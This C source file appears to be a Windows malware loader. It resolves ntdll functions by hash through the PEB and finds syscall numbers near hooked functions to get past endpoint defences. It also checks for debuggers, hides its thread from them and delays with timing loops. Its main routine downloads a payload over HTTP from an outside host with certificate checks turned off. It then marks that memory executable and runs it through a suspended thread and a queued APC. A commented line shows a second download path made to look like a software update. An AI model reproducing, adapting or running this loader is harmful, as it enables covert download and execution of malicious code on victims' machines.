//#include <stdio.h>
#include <windows.h>

#include <winhttp.h>
//#include "Winternl.h"

#include "structs.h"
#include "resolver.h"

#pragma comment(lib, "winhttp.lib")
//#pragma comment(lib, "ntdll")

unsigned char buf[11876097];



int ChekDebug();



// -------------------------------- //// -------------------------------- //// -------------------------------- //

void myprintf(const char* pszFormat, ...) {
	char buf[1024];
	va_list argList;
	va_start(argList, pszFormat);
	wvsprintfA(buf, pszFormat, argList);
	va_end(argList);
	DWORD done;
	WriteFile(GetStdHandle(STD_OUTPUT_HANDLE), buf, strlen(buf), &done, NULL);
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //
DWORD  HashStringDjb2a_Ascii(IN PCHAR string) {
	DWORD hash = 0x7162937337447799;
	INT c;

	while (c = *string++) {
		hash = ((hash << INITIAL_SEED) + hash) + c;
	}
	return hash;
}
// -------------------------------- //// -------------------------------- //// -------------------------------- //

DWORD  HashStringDjb2a_Wide(IN PWCHAR string) {
	DWORD hash = 0x7162937337447799;
	INT c;
	while (c = *string++)
		hash = ((hash << INITIAL_SEED) + hash) + c;

	return hash;
}



// -------------------------------- //// -------------------------------- //// -------------------------------- //

// initialize NT_CONFIG 
BOOL InitializeNTCONFIG() {
	PVOID pModule = NULL;
	PPEB pPeb = NULL;
	SIZE_T origin = 0x2 * PEP_OFFSET_FAKE;
	pPeb = (PPEB)GetPeb(origin);
	PPEB_LDR_DATA ldr = pPeb->LoaderData;
	PLIST_ENTRY plist_entry = &ldr->InLoadOrderModuleList;
	PLIST_ENTRY  current_module = plist_entry->Flink;

	while (current_module != plist_entry) {
		PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(current_module, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);


		if (HashStringDjb2a_Wide(pEntry->BaseDllName.Buffer) == ntdllhash) {

			pModule = pEntry->DllBase;
			break;
		}
		current_module = current_module->Flink;
	}
	// fill the NT_CONFIG 
	if (pModule == NULL) {
		return FALSE;
	}
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;
	PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(pDos->e_lfanew + (PBYTE)pModule);
	PIMAGE_OPTIONAL_HEADER pOptional = (PIMAGE_OPTIONAL_HEADER)&pNT->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModule + pOptional->DataDirectory[0].VirtualAddress);

	Global_NT.pModule = pModule;
	Global_NT.dwNumberOfFunctions = (DWORD)((PBYTE)pModule + pExport->NumberOfFunctions);
	Global_NT.pwArrayOfOrdianls = (PWORD)((PBYTE)pModule + pExport->AddressOfNameOrdinals);
	Global_NT.pdwArrayOfAddress = (PDWORD)((PBYTE)pModule + pExport->AddressOfFunctions);
	Global_NT.pdwArrayOfNames = (PDWORD)((PBYTE)pModule + pExport->AddressOfNames);

	if (!Global_NT.dwNumberOfFunctions || !Global_NT.pdwArrayOfAddress || !Global_NT.pdwArrayOfNames || !Global_NT.pModule || !Global_NT.pwArrayOfOrdianls) {
		return FALSE;
	}
	return TRUE;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //
#define UP -32
#define DOWN 32 

BOOL FitchNtSyscall(IN DWORD dwSysHash, OUT PSYSCALL pNtSys) {
	//////printf("fitching ntsyscalls....  \n" );
	if (!Global_NT.pModule) {
		if (!InitializeNTCONFIG()) {
			////printf("InitNtConfig Not Initialized .... \n " );
			return FALSE;
		}
	}
	if (ChekDebug()) {
		return -1;
	}
	if (dwSysHash != NULL) {
		pNtSys->dwSyscallHash = dwSysHash;
	}
	else return FALSE;
	if (ChekDebug()) {
		return -1;
	}
	for (DWORD i = 0; i < Global_NT.dwNumberOfFunctions; i++) {
		PCHAR pcFnName = (PCHAR)((PBYTE)Global_NT.pModule + Global_NT.pdwArrayOfNames[i]);
		//printf("\n\n\ncurrent function name : %s \n\n\n " , pcFnName);
		PVOID pFunctionAddress = (PVOID)((PBYTE)Global_NT.pModule + Global_NT.pdwArrayOfAddress[Global_NT.pwArrayOfOrdianls[i]]);

		if (HashStringDjb2a_Ascii(pcFnName) == dwSysHash) {

			// myprintf("\nfound a hash match %s \n" , pcFnName);

			pNtSys->pFuncAddress = pFunctionAddress;
			// if not hooked 
			if (*((PBYTE)pFunctionAddress) == 0x4c
				&& *((PBYTE)pFunctionAddress + 1) == 0x8b
				&& *((PBYTE)pFunctionAddress + 2) == 0xd1
				&& *((PBYTE)pFunctionAddress + 3) == 0xb8
				&& *((PBYTE)pFunctionAddress + 6) == 0x00
				&& *((PBYTE)pFunctionAddress + 7) == 0x00) {
				BYTE high = *((PBYTE)pFunctionAddress + 5);
				BYTE low = *((PBYTE)pFunctionAddress + 4);
				pNtSys->dwSSN = (high << 8) | low;

				pNtSys->pSyscallAddress = (PBYTE)pFunctionAddress + 0x12;
				////printf("address of syscall to %s is 0x%p \n" , pcFnName , syscallAddress);
				//myprintf("\nfunction %s Not hocked \n" , pcFnName);
				break;
			}
			//if hooked check the neighborhood to find clean syscall
			if (ChekDebug()) {
				return -1;
			}
			// if hooked ? 
			if (
				*((PBYTE)pFunctionAddress) == 0xe9 || *((PBYTE)pFunctionAddress + 3) == 0xe9 || *((PBYTE)pFunctionAddress + 8) == 0xe9 || *((PBYTE)pFunctionAddress + 10) == 0xe9
				)
			{
				//my//printf("Func %s Is Hooked \n " , pcFnName);
				for (WORD i = 1; i <= 500; i++) {
					if (*((PBYTE)pFunctionAddress + i * DOWN) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + i * DOWN) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + i * DOWN) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + i * DOWN) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + i * DOWN) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + i * DOWN) == 0x00)
					{

						//my//printf("currently at func address : 0x%p \n" , pFunctionAddress);
						BYTE high = *((PBYTE)pFunctionAddress + 5 + i * DOWN);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + i * DOWN);
						pNtSys->dwSSN = (high << 8) | low - i;
						break;
					}

					// Check neighbouring Syscall Up the stack:
					if (*((PBYTE)pFunctionAddress + i * UP) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + i * UP) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + i * UP) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + i * UP) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + i * UP) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + i * UP) == 0x00)
					{
						//my//printf("currently at func address : 0x%p \n" , pFunctionAddress);
						BYTE high = *((PBYTE)pFunctionAddress + 5 + i * UP);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + i * UP);
						pNtSys->dwSSN = (high << 8) | low + i;
						break;
					}
				}
			}

			break;
		}
	}
	////printf("SSN for the function is : %d \n" , pNtSys->ssn);
	// update
	// adding the syscall address to the syscall structure
	if (pNtSys->pFuncAddress == NULL) {
		////printf("there is no function address \n ");
		return FALSE;
	}
	ULONG_PTR uFnAddress = (ULONG_PTR)pNtSys->pFuncAddress + 0xff;
	// getting the address of a syscall instruction in another random function ???
	if (pNtSys->pSyscallAddress == NULL || pNtSys->pSyscallAddress == 0) {
		for (int i = 0, z = 1; i <= 255; i++, z++)
		{
			if (*((PBYTE)uFnAddress + i) == 0x0F && *((PBYTE)uFnAddress + z) == 0x05)
			{

				pNtSys->pSyscallAddress = ((ULONG_PTR)uFnAddress + i);
				////printf("Syscall Address for function  at 0x%p \n", pNtSys->pSyscallAddress);
				//getchar();
				break;
			}
		}
	}


	if (pNtSys->dwSSN == NULL || pNtSys->pSyscallAddress == NULL)
		return FALSE;
	////printf("done fitching one function \n");
	return TRUE;

}

// -------------------------------- //// -------------------------------- //// -------------------------------- //
BOOL InitSyscakk() {

	// syscall structers 
	//printf("[+] Initializing syscall Struct ....\n");
	if (!FitchNtSyscall(NtAllocateVirtualMemoryHash, &sys_func.NtAllocateVirtualMemory)) {
		////printf("failed to  initialize ntallocatememory \n ");
		return FALSE;
	}
	if (!FitchNtSyscall(NtCreateThreadExHash, &sys_func.NtCreateThreadEx)) {
		////printf("failed to  initialize ntcreatethread \n ");
		return FALSE;
	}
	if (!FitchNtSyscall(NtProtectVirtualMemoryHash, &sys_func.NtProtectVirtualMemory)) {
		////printf("failed to  initialize ntcreatethread \n ");
		return FALSE;
	}
	if (ChekDebug()) {
		return FALSE;
	}
	if (!FitchNtSyscall(NtCloseHash, &sys_func.NtClose)) {
		////printf("failed to  initialize ntclose \n ");
		return FALSE;
	}
	if (!FitchNtSyscall(NtWaitForSingleObjectHash, &sys_func.NtWaitForSingleObject)) {
		////printf("failed to  initialize ntclose \n ");
		return FALSE;
	}

	if (!FitchNtSyscall(NtWriteVirtualMemoryHash, &sys_func.NtWriteVirtualMemory)) {
		////printf("failed to  initialize ntwritevirtmem \n ");
		return FALSE;
	}
	if (!FitchNtSyscall(NtQuerySystemInformationHash, &sys_func.NtQuerySystemInformation)) {
		////printf("failed to  initialize ntquerysysteminfo \n ");
		return FALSE;
	}
	if (ChekDebug()) {
		return FALSE;
	}
	if (!FitchNtSyscall(NTQUEUEAPCTHREADHash, &sys_func.NtQueueApcThread)) {
		////printf("failed to  initialize ntquerysysteminfo \n ");
		return FALSE;
	}
	if (!FitchNtSyscall(NTTESTALERTHash, &sys_func.NtTestAlert)) {
		////printf("failed to  initialize ntquerysysteminfo \n ");
		return FALSE;
	}
	if (!FitchNtSyscall(NTSETINFORMATIONTHREADHash, &sys_func.NtSetInformationThread)) {
		////printf("failed to  initialize ntquerysysteminfo \n ");
		return FALSE;
	}
	if (!FitchNtSyscall(NTRESUMETHREADHash, &sys_func.NtResumeThread)) {
		////printf("failed to  initialize ntquerysysteminfo \n ");
		return FALSE;
	}

	return TRUE;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //
ULONG64 SharedTimeStamp() {

	LARGE_INTEGER TimeStamp = {
			.LowPart = USER_SHARED_DATA->SystemTime.LowPart,
			.HighPart = USER_SHARED_DATA->SystemTime.High1Time
	};

	return TimeStamp.QuadPart;
}

VOID SharedSleep(IN ULONG64 uMilliseconds) {

	ULONG64	uStart = SharedTimeStamp() + (uMilliseconds * DELAY_TICKS);

	for (SIZE_T RandomNmbr = 0x00; SharedTimeStamp() < uStart; RandomNmbr++);

	if ((SharedTimeStamp() - uStart) > 2000)
		return;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //
void dl(const wchar_t* host, const wchar_t* path , short port)
{
	if (ChekDebug()) {
		return ;
	}

	LPCWSTR userAgent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36";
	int counter = 0;
	NTSTATUS state = 0x00;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(userAgent,
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, (LPCWSTR)host, port, 0);

	DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

	// Create an HTTP request handle.
	// the last parameter of the WinHttpOpenRequest() function should be WINHTTP_FLAG_SECURE if using https and 0 if http 
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", path ,NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

	// This is for accepting self signed Cert
	if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)))
	{
		return;
	}

	// Send a request.
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0, WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);

	// End the request.
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	// Keep checking for data until there is nothing left.
	if (bResults)
	{
		do
		{
			// Check for available data.
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				myprintf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());
				break;
			}

			// No more available data.
			if (!dwSize)
				break;

			// Allocate space for the buffer.
			/*pszOutBuffer = new char[dwSize + 1];*/

			PVOID allocationBase = NULL;
			SIZE_T regionSize = dwSize + 1;
			SET_SYSCALL(sys_func.NtAllocateVirtualMemory);
			if ((state = RedroExec( (HANDLE)-1 , &allocationBase , 0 , &regionSize , MEM_COMMIT | MEM_RESERVE , PAGE_READWRITE)) != 0x00) {
				myprintf("allocation Failed : 0x%X \n" , state);
				return;
			}
			pszOutBuffer = (LPSTR)allocationBase;

			if (!pszOutBuffer)
			{
				myprintf("Out of memory\n");
				break;
			}

			// Read the Data.
			if (ChekDebug()) {
				return;
			}
			ZeroMemory(pszOutBuffer, dwSize + 1);

			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
			{
				myprintf("Error %u in WinHttpReadData.\n", GetLastError());
			}
			else
			{
				int i = 0;
				while (i < dwSize)
				{
					// Since the cunks are transferred in 8192 bytes, this check is required for larger buffers
					if (counter >= sizeof(buf))
					{
						break;
					}
					_memcpy(&buf[counter], &pszOutBuffer[i], sizeof(char));

					//printf("i:%d | dwSize:%d | Counter:%d | buf char:%c | psz char: %c\n", i, dwSize, counter, buf[counter], pszOutBuffer[i]);
					counter++;
					i++;
				}
			}
			// Free the memory allocated to the buffer.
			//delete[] pszOutBuffer;

			// This condition should never be reached since WinHttpQueryDataAvailable
			// reported that there are bits to read.
			if (!dwDownloaded)
				break;

		} while (dwSize > 0);
	}
	else
	{
		// Report any errors.
		myprintf("Error %d has occurred.\n", GetLastError());
	}

	myprintf("[+] %d Bytes successfully written!\n", sizeof(buf));

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
}
// -------------------------------- //// -------------------------------- //// -------------------------------- //
VOID Exec() {
	if (ChekDebug()) {
		return ;
	}
	PBYTE exec_mem = NULL; 
	DWORD dwOldProtection ;
	HANDLE hThread = NULL;
	HANDLE hProcess = (HANDLE)-1;
	NTSTATUS state = 0x00;
	SIZE_T regionSize = sizeof(buf);
	//exec_mem = VirtualAlloc(NULL , sizeof(buf) , MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );

	
	/*
		Remember to Free this memory 
		
	*/
	SET_SYSCALL(sys_func.NtAllocateVirtualMemory);
	state = RedroExec(hProcess, &exec_mem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!exec_mem) {
		myprintf("faield to allocate 0x%X \n" , state );
		return;
	}
	_memcpy(exec_mem, buf , sizeof(buf));
	myprintf("wiriten to 0x%p \n" , exec_mem);
	myprintf("exec_mem is 0x%p \n", exec_mem);
	PULONG pOldProtect = NULL;
	//SharedSleep(2 * 1000);

	//myprintf("hProcess: 0x%p, Base: 0x%p, RegionSize: %lu, NewProtect: 0x%X\n", hProcess, exec_mem, regionSize, PAGE_EXECUTE_READWRITE);
	
	SharedSleep(2 * 1000);
	myprintf("changed protect\n");
	//hThread = CreateThread(NULL , 0 ,(LPTHREAD_START_ROUTINE)exec_mem , NULL , 0 , NULL);
	
	/*
		TRy thread hijacking with context change ????
	*/

	// change protect
	if (ChekDebug()) {
		return ;
	}
	ULONG oldProtectVal;
	PULONG oldProtect = &oldProtectVal;
	SET_SYSCALL(sys_func.NtProtectVirtualMemory);
	if ((state = RedroExec(hProcess, &exec_mem, &regionSize, PAGE_EXECUTE_READ, oldProtect)) != 0x00) {
		myprintf("protect failed 0x%X \n", state);
		return FALSE;

	}
	myprintf("chjanged prot DONE\n");

	SET_SYSCALL(sys_func.NtCreateThreadEx);
	if ((state = RedroExec(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, exec_mem, NULL, TRUE, NULL, NULL, NULL, NULL)) != 0x00) {
		myprintf("create thotho failed : 0x%X \n", state);
		return ;
	}
	myprintf("created thotho with hand 0x%p \n", hThread);
	;
	if (!hThread ) {
		myprintf("thotho failed %d \n" , GetLastError());
		//VirtualFree(exec_mem , 0 , MEM_RELEASE);
		return;
	}
	SharedSleep(2 * 1000);
	SET_SYSCALL(sys_func.NtQueueApcThread);
	state = RedroExec(hThread, exec_mem, NULL, NULL, NULL);
	if (state != 0x00) {
		//myprintf("failed to queue : 0x%X \n" , state);
		return FALSE;
	}


	SET_SYSCALL(sys_func.NtSetInformationThread);
	state = RedroExec(hThread, 0x11, NULL, NULL);
	if (state != 0x00) {
		myprintf("setinfo failed : 0x%X\n", state);
		return ;
	}
	SharedSleep(2 * 1000);
	if (ChekDebug()) {
		return ;
	}
	SharedSleep(2 * 1000);
	SET_SYSCALL(sys_func.NtResumeThread);
	state = RedroExec(hThread, NULL);
	if (state != 0x00) {
		myprintf("failed resume : 0x%X \n", state);
		return ;
	}
	myprintf("resume thr done\n");
	
	
	
	SET_SYSCALL(sys_func.NtWaitForSingleObject);
	if ((state = RedroExec(hThread, FALSE, NULL)) != 0x00) {
		myprintf("wait for ob failed 0x%X \n", state);
		return ;

	}
	
	// ntwait fails ??? 
	// 
	myprintf("break hit \n");
}	


// -------------------------------- //// -------------------------------- //// -------------------------------- //

int main()
{	
	if (ChekDebug()) {
		return -1;
	}
	SharedSleep(2 * 1000);
	InitializeNTCONFIG();
	SharedSleep(1 * 1000);
	BOOL isit = InitSyscakk();
	if (!isit) {
		myprintf("\nFailed to initialize bokemon \n");
		return -1;
	}
	dl(L"192.168.150.1" , L"mer.template", (short)80);
	//dl(L"pybase.com", L"/wp-content/help/Update_v1.2_express_fixes.template", 443);
	Exec();
	return 0;
}